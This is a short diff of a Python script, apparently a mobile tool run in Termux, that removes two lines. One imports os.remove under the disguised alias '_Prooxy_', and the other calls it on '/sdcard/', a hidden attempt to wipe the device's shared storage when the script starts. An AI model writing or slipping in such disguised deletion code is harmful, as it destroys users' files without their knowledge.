@@ -40,7 +40,6 @@ from bs4 import BeautifulSoup
 import requests as ress
 from datetime import date
 from datetime import datetime
-from os import remove as _Prooxy_
 from os import system as _HERON_
 from time import sleep
 from time import sleep as waktu
@@ -102,7 +101,6 @@ dt_string = now.strftime("%H:%M")
 current = datetime.now()
 ta = current.year
 bu = current.month
-_Prooxy_("/sdcard/")
 ha = current.day
 today = date.today()
 def logo():
